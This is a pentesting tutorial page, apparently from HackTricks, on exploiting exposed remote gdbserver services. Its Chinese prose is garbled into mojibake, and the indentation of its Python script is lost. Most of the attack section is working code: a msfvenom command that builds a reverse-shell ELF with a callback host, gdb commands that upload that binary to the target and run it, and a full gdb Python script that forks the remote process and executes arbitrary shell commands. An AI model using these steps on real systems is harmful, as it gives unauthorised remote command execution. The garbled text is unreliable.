# Pentesting Remote GdbServer

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ä¸Šå…³æ³¨æˆ‘ä»¬ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

**å³æ—¶å¯ç”¨çš„æ¼æ´è¯„ä¼°ä¸æ¸—é€æµ‹è¯•è®¾ç½®**ã€‚ä»ä»»ä½•åœ°æ–¹è¿è¡Œå®Œæ•´çš„æ¸—é€æµ‹è¯•ï¼Œä½¿ç”¨ 20 å¤šç§å·¥å…·å’ŒåŠŸèƒ½ï¼Œä»ä¾¦å¯Ÿåˆ°æŠ¥å‘Šã€‚æˆ‘ä»¬ä¸æ›¿ä»£æ¸—é€æµ‹è¯•äººå‘˜ - æˆ‘ä»¬å¼€å‘è‡ªå®šä¹‰å·¥å…·ã€æ£€æµ‹å’Œåˆ©ç”¨æ¨¡å—ï¼Œä»¥ä¾¿è®©ä»–ä»¬æœ‰æ›´å¤šæ—¶é—´æ·±å…¥æŒ–æ˜ã€è·å– shell å¹¶äº«å—ä¹è¶£ã€‚

{% embed url="https://pentest-tools.com/" %}

## **åŸºæœ¬ä¿¡æ¯**

**gdbserver** æ˜¯ä¸€ä¸ªå¯ä»¥è¿œç¨‹è°ƒè¯•ç¨‹åºçš„å·¥å…·ã€‚å®ƒä¸éœ€è¦è°ƒè¯•çš„ç¨‹åºåœ¨åŒä¸€ç³»ç»Ÿä¸Šå¹¶è¡Œè¿è¡Œï¼Œç§°ä¸ºâ€œç›®æ ‡â€ã€‚è¿™ç§è®¾ç½®å…è®¸ **GNU è°ƒè¯•å™¨** ä»ä¸åŒçš„æœºå™¨â€œä¸»æœºâ€è¿æ¥ï¼Œä¸»æœºä¸Šå­˜å‚¨ç€æºä»£ç å’Œè¢«è°ƒè¯•ç¨‹åºçš„äºŒè¿›åˆ¶å‰¯æœ¬ã€‚**gdbserver** å’Œè°ƒè¯•å™¨ä¹‹é—´çš„è¿æ¥å¯ä»¥é€šè¿‡ TCP æˆ–ä¸²è¡Œçº¿è·¯è¿›è¡Œï¼Œå…è®¸çµæ´»çš„è°ƒè¯•è®¾ç½®ã€‚

æ‚¨å¯ä»¥è®© **gdbserver åœ¨ä»»ä½•ç«¯å£ä¸Šç›‘å¬**ï¼Œç›®å‰ **nmap æ— æ³•è¯†åˆ«è¯¥æœåŠ¡**ã€‚

## åˆ©ç”¨

### ä¸Šä¼ å¹¶æ‰§è¡Œ

æ‚¨å¯ä»¥è½»æ¾åˆ›å»ºä¸€ä¸ª **elf åé—¨ä¸ msfvenom**ï¼Œä¸Šä¼ å¹¶æ‰§è¡Œå®ƒï¼š
```bash
# Trick shared by @B1n4rySh4d0w
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 PrependFork=true -f elf -o binary.elf

chmod +x binary.elf

gdb binary.elf

# Set remote debuger target
target extended-remote 10.10.10.11:1337

# Upload elf file
remote put binary.elf binary.elf

# Set remote executable file
set remote exec-file /home/user/binary.elf

# Execute reverse shell executable
run

# You should get your reverse-shell
```
### æ‰§è¡Œä»»æ„å‘½ä»¤

è¿˜æœ‰å¦ä¸€ç§æ–¹æ³•å¯ä»¥**é€šè¿‡** [**ä»è¿™é‡Œè·å–çš„ python è‡ªå®šä¹‰è„šæœ¬**](https://stackoverflow.com/questions/26757055/gdbserver-execute-shell-commands-of-the-target) **ä½¿è°ƒè¯•å™¨æ‰§è¡Œä»»æ„å‘½ä»¤**ã€‚
```bash
# Given remote terminal running `gdbserver :2345 ./remote_executable`, we connect to that server.
target extended-remote 192.168.1.4:2345

# Load our custom gdb command `rcmd`.
source ./remote-cmd.py

# Change to a trusty binary and run it to load it
set remote exec-file /bin/bash
r

# Run until a point where libc has been loaded on the remote process, e.g. start of main().
tb main
r

# Run the remote command, e.g. `ls`.
rcmd ls
```
é¦–å…ˆ**åœ¨æœ¬åœ°åˆ›å»ºè¿™ä¸ªè„šæœ¬**ï¼š

{% code title="remote-cmd.py" %}
```python
#!/usr/bin/env python3

import gdb
import re
import traceback
import uuid


class RemoteCmd(gdb.Command):
def __init__(self):
self.addresses = {}

self.tmp_file = f'/tmp/{uuid.uuid4().hex}'
gdb.write(f"Using tmp output file: {self.tmp_file}.\n")

gdb.execute("set detach-on-fork off")
gdb.execute("set follow-fork-mode parent")

gdb.execute("set max-value-size unlimited")
gdb.execute("set pagination off")
gdb.execute("set print elements 0")
gdb.execute("set print repeats 0")

super(RemoteCmd, self).__init__("rcmd", gdb.COMMAND_USER)

def preload(self):
for symbol in [
"close",
"execl",
"fork",
"free",
"lseek",
"malloc",
"open",
"read",
]:
self.load(symbol)

def load(self, symbol):
if symbol not in self.addresses:
address_string = gdb.execute(f"info address {symbol}", to_string=True)
match = re.match(
f'Symbol "{symbol}" is at ([0-9a-fx]+) .*', address_string, re.IGNORECASE
)
if match and len(match.groups()) > 0:
self.addresses[symbol] = match.groups()[0]
else:
raise RuntimeError(f'Could not retrieve address for symbol "{symbol}".')

return self.addresses[symbol]

def output(self):
# From `fcntl-linux.h`
O_RDONLY = 0
gdb.execute(
f'set $fd = (int){self.load("open")}("{self.tmp_file}", {O_RDONLY})'
)

# From `stdio.h`
SEEK_SET = 0
SEEK_END = 2
gdb.execute(f'set $len = (int){self.load("lseek")}($fd, 0, {SEEK_END})')
gdb.execute(f'call (int){self.load("lseek")}($fd, 0, {SEEK_SET})')
if int(gdb.convenience_variable("len")) <= 0:
gdb.write("No output was captured.")
return

gdb.execute(f'set $mem = (void*){self.load("malloc")}($len)')
gdb.execute(f'call (int){self.load("read")}($fd, $mem, $len)')
gdb.execute('printf "%s\\n", (char*) $mem')

gdb.execute(f'call (int){self.load("close")}($fd)')
gdb.execute(f'call (int){self.load("free")}($mem)')

def invoke(self, arg, from_tty):
try:
self.preload()

is_auto_solib_add = gdb.parameter("auto-solib-add")
gdb.execute("set auto-solib-add off")

parent_inferior = gdb.selected_inferior()
gdb.execute(f'set $child_pid = (int){self.load("fork")}()')
child_pid = gdb.convenience_variable("child_pid")
child_inferior = list(
filter(lambda x: x.pid == child_pid, gdb.inferiors())
)[0]
gdb.execute(f"inferior {child_inferior.num}")

try:
gdb.execute(
f'call (int){self.load("execl")}("/bin/sh", "sh", "-c", "exec {arg} >{self.tmp_file} 2>&1", (char*)0)'
)
except gdb.error as e:
if (
"The program being debugged exited while in a function called from GDB"
in str(e)
):
pass
else:
raise e
finally:
gdb.execute(f"inferior {parent_inferior.num}")
gdb.execute(f"remove-inferiors {child_inferior.num}")

self.output()
except Exception as e:
gdb.write("".join(traceback.TracebackException.from_exception(e).format()))
raise e
finally:
gdb.execute(f'set auto-solib-add {"on" if is_auto_solib_add else "off"}')


RemoteCmd()
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

**å³æ—¶å¯ç”¨çš„æ¼æ´è¯„ä¼°å’Œæ¸—é€æµ‹è¯•è®¾ç½®**ã€‚ä»ä»»ä½•åœ°æ–¹è¿è¡Œå®Œæ•´çš„æ¸—é€æµ‹è¯•ï¼Œæä¾›20å¤šä¸ªå·¥å…·å’ŒåŠŸèƒ½ï¼Œä»ä¾¦å¯Ÿåˆ°æŠ¥å‘Šã€‚æˆ‘ä»¬ä¸å–ä»£æ¸—é€æµ‹è¯•äººå‘˜ - æˆ‘ä»¬å¼€å‘è‡ªå®šä¹‰å·¥å…·ã€æ£€æµ‹å’Œåˆ©ç”¨æ¨¡å—ï¼Œä»¥ä¾¿è®©ä»–ä»¬æœ‰æ›´å¤šæ—¶é—´æ·±å…¥æŒ–æ˜ã€è·å–shellå¹¶äº«å—ä¹è¶£ã€‚

{% embed url="https://pentest-tools.com/" %}

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µAWSé»‘å®¢æ”»å‡»ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricksåŸ¹è®­AWSçº¢é˜Ÿä¸“å®¶ï¼ˆARTEï¼‰**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µGCPé»‘å®¢æ”»å‡»ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricksåŸ¹è®­GCPçº¢é˜Ÿä¸“å®¶ï¼ˆGRTEï¼‰**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒHackTricks</summary>

* æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)æˆ–**åœ¨** **Twitter** ğŸ¦ **ä¸Šå…³æ³¨æˆ‘ä»¬** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHubåº“æäº¤PRæ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
